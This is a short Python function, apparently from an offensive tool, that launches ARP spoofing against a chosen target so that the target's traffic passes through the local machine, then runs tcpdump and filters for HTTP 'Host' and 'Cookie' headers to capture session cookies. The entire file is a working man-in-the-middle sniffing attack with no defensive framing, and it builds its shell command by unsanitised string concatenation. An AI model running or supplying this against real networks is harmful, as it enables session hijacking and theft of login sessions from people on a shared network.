import os

def spoof_dump(interface_name, network_id, target_ip):
	os.system("arpspoof -i "+interface_name+" -t "+target_ip+' '+network_id+".1"+" & "\
	+'tcpdump -l -v -i '+interface_name+' | grep -E "Host|Cookie"')

 
